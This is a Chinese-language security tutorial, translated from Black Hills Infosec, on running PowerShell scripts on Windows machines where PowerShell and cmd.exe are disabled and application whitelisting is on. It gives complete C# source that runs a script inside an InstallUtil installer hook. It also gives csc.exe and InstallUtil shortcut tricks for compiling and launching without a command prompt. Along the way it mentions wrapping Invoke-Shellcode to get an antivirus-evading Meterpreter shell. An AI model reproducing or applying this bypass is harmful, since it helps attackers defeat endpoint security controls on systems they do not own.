> 原文链接: https://www.anquanke.com//post/id/84488 


# 禁用了PowerShell又如何？看我如何用PowerShell绕过应用白名单、环境限制、以及杀毒软件


                                阅读量   
                                **153471**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            





[![](https://p5.ssl.qhimg.com/t01b50a114a8a49ce34.png)](https://p5.ssl.qhimg.com/t01b50a114a8a49ce34.png)

**温故而知新**

在之前的[文章](http://www.blackhillsinfosec.com/?p=5226)中，我们讨论了如何通过Casey Smith（[@ subTee](http://www.twitter.com/subTee)）设计出的方法来绕过反病毒软件和应用白名单。这一次，我们的测试条件将变得更为苛刻。用于测试的目标系统中不仅设置有反病毒软件和应用白名单，而且还禁用了PowerShell和命令行工具（cmd.exe）。在测试的过程中，我们也遇到了各种各样的问题，我们将在这篇文章中讨论这些问题和测试过程中所发生的意外情况。

现在，越来越多的公司开始逐渐意识到，普通用户其实根本就不需要使用命令行工具（cmd.exe）、PowerShell、以及其他一些看起来比较高大上的工具。我们也发现，禁用这些高级工具也是保护系统安全的一种非常好的实践方法。

如果你看过我们出的《[Sacred Cash Cow Tipping](https://www.youtube.com/watch?v=DzC8jJ0ESJ0)》系列视频，那么你应该还记得我当时设计出了一种能够在C#程序中执行Invoke-Shellcode.ps1文件的方法。实际上，你只需要直接将这个Invoke-Shellcode.ps1文件中的代码全部放在一行，然后将该文件的所有内容嵌入到C#程序的一个字符串变量中就可以了。你将会得到一个独立的可执行文件，它可以生成一个Meterpreter Shell，并且可以绕过目前绝大多数的反病毒产品。

 

**写在前面的话**

那么，刚才所介绍的那些内容与我们这篇文章有半毛钱关系吗？当然有了，不然我 介绍来干嘛。实际上，我们只需要将刚才这一概念稍微扩展一下，就可以轻松地在一个禁用了PowerShell的环境中执行任意的PowerShell脚本了。

[![](https://p4.ssl.qhimg.com/t01e2b279a77deb20e6.png)](https://p4.ssl.qhimg.com/t01e2b279a77deb20e6.png)

我们应该怎么做呢？从本质上来讲，C#和PowerShell其实都是运行在.Net框架之上的高级实现。这也就意味着，我们可以通过C#可执行程序直接调用.Net框架开放给PowerShell的那部分功能。如果你愿意的话，你可以编写一个C#程序，然后用它来实现PowerShell脚本的所有功能。

 

**少说话，多做事**

准备工作已经做得差不多了，让我们开始动手实现吧！首先，在你的Windows桌面上用记事本创建一个新的文本文件，然后将其重命名为Program.cs。好吧..其实随便你取什么名字都可以，这只是个不成熟的小建议。创建完成之后，用NotePad++之类的文本编辑器打开它。现在，我们需要在文件的顶部写入下列声明语句，并引入我们所要使用到的某些功能：



```
using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;
```



为了确保我们的程序能够编译成功，我们还需要定义一个类，并在这个类中添加一个Main()方法。通常情况下，我们的程序都会从这个Main()函数那里开始执行。需要注意的是，这个类的类名必须与我们的文件名（Program.cs）相同。将下列代码添加到资源声明语句的下方：



```
public class Program
 `{`
    public static void Main()
    `{`
    `}`
 `}`
```



接下来，我们要定义程序真正的入口函数了。请注意，我们需要使用InstallUtil.exe工具来运行我们的程序，而不是直接用鼠标左键双击运行。我就不卖关子了，正是这一技巧将帮助我们绕过应用白名单的限制。

为了完成我们的目标，我定义了一个名为“Sample”的类，并让它继承Installer类。然后，我还声明了一个名为“Uninstall”的方法，这个方法就是我们程序真正的入口函数。所以，我们的程序所要执行的第一个任务就是调用这个名为“Exec”的方法（Exec()是Mycode类中的一个方法）。除此之外，我们还要在这个类的上方添加一条声明语句，用来表示这个类需要在程序的安装过程中被调用执行。在Program.cs文件的底部添加下列代码：



```
[System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 `{`
 public override void Uninstall(System.Collections.IDictionary savedState)
 `{`
 Mycode.Exec();
 `}`
 `}`
```



我们所要写的最后一部分代码就是去定义一个Mycode类，然后在这个类中添加一个名为“Exec”的方法。这个方法可以根据用户提供的文件路径读入一个PowerShell脚本，脚本路径定义在符号@“”的双引号之中。在我的测试环境中，我的PowerShell脚本存储路径为“C:UsersfmcDesktopPowerUp.ps1”，接下来的代码用来设置PowerShell脚本在执行过程中所要使用到的变量和参数。

最后，在pipeline.Invoke()函数被调用之后，也就意味着我们的PowerShell脚本被执行了。将下列代码添加到Program.cs文件的末尾处：



```
public class Mycode
 `{`
 public static void Exec()
 `{`
 string command = System.IO.File.ReadAllText(@"C:UsersfmcDesktopPowerUp.ps1");
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.Invoke();
 `}`
 `}`
```



Program.cs文件完整的代码如下所示：

 



```
using System;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Management.Automation.Runspaces;
 public class Program
 `{`
 public static void Main()
 `{`
 `}`
 `}`
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 `{`
 public override void Uninstall(System.Collections.IDictionary savedState)
 `{`
 Mycode.Exec();
 `}`
 `}`
 public class Mycode
 `{`
 public static void Exec()
 `{`
 string command = System.IO.File.ReadAllText(@"C:UsersfmcDesktopPowerUp.ps1");
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.Invoke();
 `}`
 `}`
```



在这个例子中，我使用到了Veil-Framework的PowerUp脚本，你可以在PowerShell的命令行工具中执行下列命令，然后将运行结果保存到一个文件中：



```
Import-Module PowerUp.ps1
Invoke-AllChecks -Verbose | Out-File C:UsersfmcDesktopallchecks.txt
```

    

为了保证这个方法能够正确地调用我们所需的函数，我们还需要在脚本的末尾调用一个显式函数。打开PowerUp.ps1脚本，然后在脚本文件的底部添加下列函数调用语句，请一定要确保语句中的Out-File参数设置正确。保存文件，并退出编辑器。

```
Invoke-AllChecks -Verbose | Out-File C:UsersfmcDesktopallchecks.txt
```



[![](https://p5.ssl.qhimg.com/t01aa73dd8107085371.png)](https://p5.ssl.qhimg.com/t01aa73dd8107085371.png)

现在，我们需要使用csc.exe工具来对我们的程序进行编译。下面这段命令可以编译我们的Program.cs文件，并生成一个名为“powerup.exe”的可执行文件：



```
C:WindowsMicrosoft.NETFramework64v2.0.50727csc.exe
/r:C:WindowsassemblyGAC_MSILSystem.Management.Automation1.0.0.0_
31bf3856ad364e35System.Management.Automation.dll /unsafe /platform:anycpu
/out:C:UsersfmcDesktoppowerup.exe C:UsersfmcDesktopProgram.cs
```



请等一下，不是说好了cmd.exe已经被禁用了吗？别担心，打开你的资源管理器，然后切换到下面这个目录：

```
C:WindowsMicrosoft.NETFramework64v2.0.50727
```



鼠标右键点击csc.exe程序，然后在弹出菜单中选择“创建快捷方式”。点击之后，系统会弹出一个提示框，提示信息会告诉你不能在这里创建快捷方式，如果你一定要的话，系统可以帮你在桌面创建一个快捷方式。

[![](https://p2.ssl.qhimg.com/t018f76d4e5cee929fb.png)](https://p2.ssl.qhimg.com/t018f76d4e5cee929fb.png)

[![](https://p4.ssl.qhimg.com/t01a979d6b8462cc709.png)](https://p4.ssl.qhimg.com/t01a979d6b8462cc709.png)

现在，请回到系统桌面。鼠标右键点击csc.exe程序的快捷方式，然后在菜单中选择“属性”。

[![](https://p4.ssl.qhimg.com/t01ddeafc4bf974df43.png)](https://p4.ssl.qhimg.com/t01ddeafc4bf974df43.png)

在属性窗口的“快捷方式”那一栏中，用下列信息替换掉“目标（T）”中的全部内容（请确保文件名和其他的信息是正确的）：



```
C:WindowsMicrosoft.NETFramework64v2.0.50727csc.exe
/r:C:WindowsassemblyGAC_MSILSystem.Management.Automation1.0.0.0_
31bf3856ad364e35System.Management.Automation.dll /unsafe /platform:anycpu
/out:C:UsersfmcDesktoppowerup.exe
```



设置完成之后，点击“应用”，然后关闭“属性”窗口。我们刚刚所做的就是设置csc.exe运行时所需的参数。我们在这里之所以没有设置Program.cs程序的文件路径，主要是因为如下两个原因：（1）主要原因是“目标（T）”这一栏有最大字符数量的限制，如果我们将Program.cs文件的完整路径添加进去的话，肯定会超过其所能接受的最大字符长度；（2）我们可以直接将Program.cs文件拖拽到csc.exe快捷方式上，csc.exe程序将会自动加载Program.cs文件。

[![](https://p0.ssl.qhimg.com/t01964ad99d8154314f.png)](https://p0.ssl.qhimg.com/t01964ad99d8154314f.png)

现在，直接将我们的Program.cs文件拖拽到桌面的csc.exe图标上，程序会自动编译该文件。如果不出什么意外的话，桌面上应该会出现一个名为“powerup.exe”的文件。那么恭喜你，即便是在不使用命令行工具或者Visual Studio的情况下，你依然成功地编译好了一个C#程序了！

[![](https://p3.ssl.qhimg.com/t01216697311524e3ad.png)](https://p3.ssl.qhimg.com/t01216697311524e3ad.png)

最后，我们需要使用InstallUtil.exe来运行我们的程序，这一步骤与csc.exe程序的使用方法差不多。切换到下面这个目录：

```
C:WindowsMicrosoft.NETFramework64v2.0.50727
```



其他步骤基本相同，但是请注意，InstallUtil.exe快捷方式中的“目标（T）”这一栏数据需要用下列信息替换：



```
C:WindowsMicrosoft.NETFrameworkv2.0.50727InstallUtil.exe
/logfile=C:UsersfmcDesktoplog.txt /LogToConsole=false /U
```



点击“应用”，然后关闭窗口。

[![](https://p3.ssl.qhimg.com/t01de8c53f74399b9aa.png)](https://p3.ssl.qhimg.com/t01de8c53f74399b9aa.png)

请回到桌面，将powerup.exe程序拖到InstallUtil程序的快捷方式上。

[![](https://p3.ssl.qhimg.com/t015aba0ec18313bdbc.png)](https://p3.ssl.qhimg.com/t015aba0ec18313bdbc.png)

现在，当脚本开始运行后，屏幕上应该会显示一个命令行界面。但是，当你打开任务管理器之后，你就会发现cmd.exe并不在当前运行的进程列表中，列表中只有一个InstallUtil.exe。

[![](https://p3.ssl.qhimg.com/t01b45250f40ddfdb10.png)](https://p3.ssl.qhimg.com/t01b45250f40ddfdb10.png)

[![](https://p5.ssl.qhimg.com/t0136ca05f2bfc677bd.png)](https://p5.ssl.qhimg.com/t0136ca05f2bfc677bd.png)

我们可以在命令行工具中输入下列命令来确认进程信息：

```
wmic process list full &gt; Desktopsave.txt
```



[![](https://p0.ssl.qhimg.com/t01cad852f9826b1029.png)](https://p0.ssl.qhimg.com/t01cad852f9826b1029.png)

在对“wmic”命令的输出数据进行了分析之后，我们发现InstallUtil.exe其实是通过explorer.exe调用的，而并非是cmd.exe。

[![](https://p5.ssl.qhimg.com/t010c8b4139e8c64102.png)](https://p5.ssl.qhimg.com/t010c8b4139e8c64102.png)

[![](https://p4.ssl.qhimg.com/t01e8f04470979c6d33.png)](https://p4.ssl.qhimg.com/t01e8f04470979c6d33.png)

如果不出意外的话，当脚本执行完毕后，你的桌面上将会出现一个名为“allchecks.txt”的文件，打开文件你就可以看到PowerUp.ps1的输出信息了。

[![](https://p4.ssl.qhimg.com/t011d642cf726fd4115.png)](https://p4.ssl.qhimg.com/t011d642cf726fd4115.png)

[![](https://p1.ssl.qhimg.com/t01a726bc1c5fdc20ba.png)](https://p1.ssl.qhimg.com/t01a726bc1c5fdc20ba.png)

**总结**

在这篇文章中，我介绍了一种能够在启用了应用白名单，并且禁用了powershell.exe和cmd.exe的环境下执行PowerShell脚本的方法。但是，在实际的使用过程中，你还应该注意以下几点：

1.     确保你的脚本没有使用Write-Host；

2.     这种方法有可能会导致程序发生崩溃；

3.     建议使用Write-Output或者Out-File；

4.     如果你的脚本需要用户交互的话，建议使用-Force选项；

以上就是我们今天的全部内容，不知道大家是否满意呢？提醒大家一下，这种方法同样可以用来绕过反病毒软件，我们将会在下一期的教程中一步一步教大家如何操作，请大家持续关注安全客！

<br style="text-indent:2em;text-align:left">
